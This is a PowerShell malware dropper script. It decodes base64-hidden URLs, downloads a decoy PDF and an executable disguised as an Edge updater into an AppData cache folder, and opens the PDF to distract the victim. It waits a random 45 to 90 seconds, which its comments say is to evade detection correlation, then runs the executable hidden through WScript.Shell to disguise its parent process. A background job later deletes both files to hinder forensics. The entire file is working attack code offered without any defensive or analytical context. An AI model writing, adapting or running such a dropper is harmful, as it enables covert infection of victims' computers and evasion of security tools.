# launcher.ps1 - Extended delay + WScript.Shell launcher
# No AMSI bypass, no registry writes, no scheduled tasks
$ErrorActionPreference = 'SilentlyContinue'

# Random initial delay (2-8 seconds)
Start-Sleep -Milliseconds (Get-Random -Min 2000 -Max 8000)

# Use a less monitored folder
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) { 
    New-Item -ItemType Directory -Path $cache -Force | Out-Null 
}

# Base64 encoded URLs
$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))

$pdfPath = "$cache\doc.pdf"
$exePath = "$cache\helper.exe"

# Download PDF
$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
try {
    Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing
} catch {
    # Silently continue on error
}

# Random delay between downloads (1.5-4 seconds)
Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)

# Download EXE
try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing
} catch {
    # Silently continue on error
}

# Open PDF decoy
try {
    Start-Process $pdfPath
} catch {
    # Silently continue
}

# CRITICAL: Long delay before launching EXE (45-90 seconds)
# This breaks the temporal correlation between PowerShell download and EXE execution
Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)

# Launch EXE via WScript.Shell (parent becomes explorer.exe, not PowerShell)
try {
    $wsh = New-Object -ComObject WScript.Shell
    $wsh.Run("`"$exePath`"", 0, $false)
} catch {
    # Fallback: direct Start-Process if COM fails
    Start-Process $exePath -WindowStyle Hidden
}

# Optional: Clean up EXE after 5 minutes (prevents disk forensics)
Start-Job -ScriptBlock {
    Start-Sleep -Seconds 300
    Remove-Item -Path $args[0] -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $args[1] -Force -ErrorAction SilentlyContinue
} -ArgumentList $exePath, $pdfPath | Out-Null
